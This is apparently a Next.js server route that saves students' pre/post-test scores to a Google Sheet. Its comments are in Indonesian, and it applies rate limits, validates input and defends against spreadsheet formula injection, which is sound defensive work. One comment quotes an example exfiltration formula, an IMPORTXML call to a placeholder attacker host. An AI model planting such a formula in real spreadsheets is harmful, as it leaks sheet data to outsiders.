import { NextResponse } from 'next/server'
import { rateLimit, getClientIp } from '../../lib/rateLimit'

// ============================================================
//  POST /api/simpan-hasil
// ------------------------------------------------------------
//  Meneruskan hasil pre/post-test ke Google Sheet lewat webhook Apps Script.
//  URL webhook dan tokennya disimpan sebagai env var di server dan TIDAK PERNAH
//  dikirim ke browser — kalau dipanggil langsung dari sisi klien, token akan
//  terbaca siapa saja dan sheet bisa dibanjiri data palsu.
// ============================================================

const SHEET_WEBHOOK_URL   = process.env.SHEET_WEBHOOK_URL
const SHEET_WEBHOOK_TOKEN = process.env.SHEET_WEBHOOK_TOKEN

const MAKS_TEKS = 80
const MAKS_SKOR = 25

// Karakter pembuka yang membuat Google Sheets memperlakukan isi sel sebagai
// RUMUS, bukan teks. Tanpa penetralan, isian seperti
//   =IMPORTXML("https://penyerang/?d="&B2)
// akan dieksekusi saat Sheet dibuka dan dapat mengirim isi sel keluar.
const AWALAN_RUMUS = /^[=+\-@]/

function bersih(s) {
  let v = String(s ?? '').replace(/[\r\n\t]+/g, ' ').trim().slice(0, MAKS_TEKS)
  // Apostrof di depan memaksa Sheets membaca sebagai teks; apostrofnya sendiri
  // tidak ikut tampil sehingga data tetap terbaca apa adanya saat dianalisis.
  if (AWALAN_RUMUS.test(v)) v = "'" + v
  return v
}

// NIM dipakai sebagai KUNCI (anti-duplikat & pencarian skor pra-tes), jadi tidak
// boleh diberi apostrof — cukup dibatasi ke karakter yang aman.
function bersihNim(s) {
  return String(s ?? '').trim().replace(/[^A-Za-z0-9._-]/g, '').slice(0, 30)
}

const angka = v => {
  const n = Number(v)
  return Number.isFinite(n) && n >= 0 && n <= MAKS_SKOR ? n : 0
}

export async function POST(request) {
  // ── Lapis 1: batas longgar per-IP ──
  // Sengaja longgar: SATU KELAS di WiFi kampus tampak sebagai satu IP.
  // Pembatas yang sebenarnya ada di lapis 2, berbasis NIM.
  const ip = getClientIp(request)
  if (!rateLimit(`simpan-ip:${ip}`, { limit: 120, windowMs: 60_000 }).ok) {
    return NextResponse.json(
      { status: 'error', error: 'Terlalu banyak permintaan dari jaringan ini. Tunggu sebentar lalu coba lagi.' },
      { status: 429 })
  }

  if (!SHEET_WEBHOOK_URL || !SHEET_WEBHOOK_TOKEN) {
    return NextResponse.json(
      { status: 'error', error: 'Penyimpanan hasil belum dikonfigurasi. Hubungi dosen pengampu.' },
      { status: 503 })
  }

  let body
  try { body = await request.json() } catch {
    return NextResponse.json({ status: 'error', error: 'Body tidak valid.' }, { status: 400 })
  }

  const nim   = bersihNim(body.nim)
  const nama  = bersih(body.nama)
  const kelas = bersih(body.kelas)
  const form  = body.form === 'pre' || body.form === 'post' ? body.form : null
  const skor  = Number(body.skor)
  const maks  = Number(body.maks)
  const perDim = body.perDim && typeof body.perDim === 'object' ? body.perDim : {}
  const perSub = body.perSub && typeof body.perSub === 'object' ? body.perSub : {}

  if (!nim || !nama || !form) {
    return NextResponse.json(
      { status: 'error', error: 'Nama, NIM, dan jenis tes wajib diisi.' }, { status: 400 })
  }
  if (!Number.isInteger(skor) || skor < 0 || skor > MAKS_SKOR || maks !== MAKS_SKOR) {
    return NextResponse.json({ status: 'error', error: 'Skor tidak valid.' }, { status: 400 })
  }

  // ── Lapis 2: batas ketat per-MAHASISWA ──
  // Satu mahasiswa wajar mengirim beberapa kali (mis. percobaan ulang saat
  // jaringan tersendat), tetapi tidak puluhan. Dengan kunci NIM, satu kelas
  // tidak lagi saling menghabiskan jatah.
  if (!rateLimit(`simpan-nim:${nim}:${form}`, { limit: 6, windowMs: 60_000 }).ok) {
    return NextResponse.json(
      { status: 'error', error: 'Terlalu banyak percobaan untuk NIM ini. Tunggu sebentar.' },
      { status: 429 })
  }

  const payload = {
    token: SHEET_WEBHOOK_TOKEN,
    nim, nama, kelas, form, skor, maks,
    // subskala
    ct: angka(perSub.CT), ail: angka(perSub.AIL),
    // dimensi Computational Thinking (CSTA)
    dek: angka(perDim.DEK), pol: angka(perDim.POL), abs: angka(perDim.ABS),
    alg: angka(perDim.ALG), eva: angka(perDim.EVA), gen: angka(perDim.GEN),
    // dimensi AI Literacy (Ng et al.)
    mem: angka(perDim.MEM), men: angka(perDim.MEN), mgv: angka(perDim.MGV),
    mcp: angka(perDim.MCP), etk: angka(perDim.ETK),
    // dibatasi panjangnya supaya tidak ada sel raksasa yang masuk ke Sheet
    jawaban: JSON.stringify(Array.isArray(body.jawaban) ? body.jawaban.slice(0, MAKS_SKOR) : []).slice(0, 2000),
  }

  try {
    const res = await fetch(SHEET_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      // Sengaja 9 detik, DI BAWAH batas durasi fungsi Vercel (Hobby ±10 detik).
      // Kalau lebih lama, Vercel memutus lebih dulu dan pesan gagalnya menyesatkan.
      signal: AbortSignal.timeout(9_000),
    })
    const teks = await res.text()
    let data
    try { data = JSON.parse(teks) } catch { data = { status: 'ok' } }
    return NextResponse.json(data)
  } catch (err) {
    console.error('simpan-hasil error:', err?.message)
    return NextResponse.json(
      { status: 'error', error: 'Gagal menyimpan hasil ke server. Coba lagi.' }, { status: 502 })
  }
}
